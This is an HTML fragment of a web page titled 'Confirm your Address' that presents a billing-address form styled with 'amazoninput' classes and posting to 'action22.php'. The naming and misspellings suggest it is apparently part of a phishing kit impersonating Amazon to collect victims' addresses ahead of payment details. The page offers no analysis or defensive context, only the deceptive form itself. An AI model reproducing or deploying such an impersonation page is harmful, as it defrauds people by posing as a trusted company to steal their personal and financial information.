                    ...
                    <div class="a-content">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div align="center"> <img src="./files/account.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;">Confirm your Address</span> </div>
                                    ...
                                    <div class="mypayementarea">
                                        <form action="action22.php" method="post" name="konzform" id="konzform" novalidate="novalidate"> <span class="colorblacked">Billing address</span>
                                            <div class="row mt-2">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="adressline1">
                                                            Address                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="address" id="adressline1" placeholder="Street address or P.O. box" minlength="5" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="adressline2">
                                                            City                                                        </label>
                                                        <input type="text" id="cityp" class="form-control amazoninput cityfocus" name="cityp" placeholder="City" maxlength="25" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        ...
                                                        <input type="text" class="form-control amazoninput regionfocus" name="region" id="region" placeholder="State/Province/Region" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="zipCode">
                                                            Zip Code                                                        </label>
                                                        <input type="text" class="form-control amazoninput zipfocus" name="zipcode" id="zipCode" placeholder="Zip/Postal code" maxlength="12">
                                                    </div>
                                                </div>
                                            </div>
